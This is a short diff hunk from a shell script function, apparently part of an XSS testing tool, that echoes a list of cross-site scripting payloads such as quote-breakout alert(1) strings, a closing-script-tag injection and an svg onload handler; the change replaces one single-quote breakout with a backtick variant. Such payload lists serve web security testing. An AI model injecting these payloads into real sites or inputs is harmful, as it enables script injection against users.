@@ -531,7 +531,7 @@ p_script() {
     echo "'-alert(1)-'"
     echo '";alert(1)//'
     echo '"-alert(1)-"'
-    echo '\';alert(1)//'
+    echo "\`;alert(1)//"
     echo "1;alert(1)"
     echo '</script><script>alert(1)</script>'
     echo '</script><svg onload=alert(1)>'
